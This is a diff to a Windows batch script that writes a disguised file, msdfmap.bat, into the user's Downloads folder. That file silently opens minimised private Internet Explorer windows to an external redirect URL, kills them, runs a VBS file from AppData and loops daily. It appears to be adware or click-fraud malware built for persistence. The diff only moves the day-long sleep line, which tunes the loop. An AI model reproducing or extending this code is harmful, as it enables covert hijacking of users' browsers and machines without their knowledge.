@@ -174,7 +174,6 @@ ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redire
 
 ECHO ping -n 60 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat 
 ECHO taskkill /f /im iexplore.exe >> C:\Users\%username%\Downloads\msdfmap.bat
-ECHO ping -n 86400 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
 
 
 
@@ -208,6 +207,8 @@ ECHO    wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%user
 ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ECHO nothing >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
+
+ECHO ping -n 86400 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
 
 ECHO goto loop >> C:\Users\%username%\Downloads\msdfmap.bat
 
